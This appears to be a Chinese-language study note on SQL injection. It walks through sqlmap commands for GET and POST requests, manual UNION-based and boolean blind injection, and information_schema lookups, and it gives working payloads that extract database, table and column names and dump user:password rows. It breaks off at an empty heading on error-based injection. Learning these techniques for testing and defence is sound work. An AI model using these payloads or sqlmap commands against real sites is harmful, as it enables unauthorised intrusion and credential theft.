



##### SQL注入常规思路

1. 寻找注入点，可以通过`sqlmap`工具实现
2. 通过注入点，尝试获取数据用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息
3. 猜解关键数据库及其重要字段与内容（常见如存放管理员账户的表明、字段等），还可以获取数据库的root账号密码
4. 可以通过获取用户信息，寻找后台登录
5. 利用后台了解进一步信息



###### 1. 使用sqlmap注入，依照请求类型分类

1. ###### get请求

   由于请求内容是直接拼接在url后面，因此在使用sqlmap的时候，可以直接使用进行注入

   ```shell
   sqlmap -u "url" -p 参数名 
   ```

2. post请求

   - 方式1： 

   由于请求内容一般存在请求体内，因此可以使用`burpsuite`对请求进行截取，然后通过使用**--dbs,-D,-T,-C获取库名，指定数据库，指定表名，指定列名**

   ```shell
   sqlmap -r "文件路径" -p 参数名 (-- dbs 获取所有数据库 ) (-D 指定库名 -- tables 获取所有表) (-T 表明 --columns获取所有列明) (-C "列名，拼接" --dump破解所有行数据)
   ```

   -  方式2：

   使用自动表单,会自动发起一个请求帮你找到body中需要传递的参数

   ```shell
   sqlmap -u " url" --forms
   ```

   - 方式3

   自定指定body中参数内容，需要自己在字符串中拼接

   ```shell
   sqlmap -u "url" --data "id=1&submit=1"
   ```

   

   



##### SQL手工注入过程

1. 判断是否存在注入，判断注入类型
2. 使用`order by`猜解SQL语句的字段数
3. 获取当前数据库、表、字段名
4. 查询数据库中的账户信息



##### 联合查询注入

联合查询注入是联合两个表进行注入攻击，使用关键字`union select`对两个表进行联合查询。两个表的字段数要相同。

猜出查询表的字段名，然后使用一些函数，或者函数拼接，拼接到联合查询语句中，达到对数据库的查询。一般的函数有`version()`,`database()`,`user()`,`group_concat()`



###### Information_schema表

这个表有`columns`,`tables`,`SCHEMATA`字段中，能查询到库名、表名，和字段名。



##### 盲注入

查询结果无论对错，都不会将数据库返回信息直接展示到页面上，而是将if-else语句展示到页面上。

盲注入的方式有两种：

- 布尔型盲注入
- 延时注入



###### 布尔型盲注入

对于那些只能进行盲注入的网页，由于输入内容的改变只会造成页面UI的不一样，但是无法直接通过拼接数据库查询语句返回有消息。因此在处理盲注入的时候，通过拼接`select if(1=1,1,0)`这种判断语句，转换成自己想要知道的信息的比较，从真值中获得自己想要的信息。



1. 布尔型盲注入获取数据库敏感信息

基于布尔盲注的原理，可以构造获取数据库信息的时候，根据全字符或部分字符进行判断，从而获取数据的敏感信息。

如：

```	shell
select if(substring(database(),1,1)='d',1,0)

```



2. 黑盒模式下布尔型注入

步骤：

- 首先判断注入
- 获取数据库长度，得到长度后，通过部分截取字符比较，得到每个字符，具体操作使用burpsuite的`Cluster boomb`模式，其实也是可以自己写脚本来进行循环判断字符。
- 同样的思路去查询表
- 最后指定查询表中的数据

一般进行判断比较字符库：

```shell
a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_"
```



1. 获取库名

```shell
1' and if(substring(database(),1,1)='d',1,0)--+
```

2. 获取表名

```shell
1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)--+
```

3. 获取列名

```shell
1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1,1),1,1)='u',1,0)--+
```

4. 获取每一行数据

```shell
# 首先判断查询账号和密码的长度
1'and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)=38,1,0)--+
# 获取账号密码
1'and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)--+
```



##### 报错注入

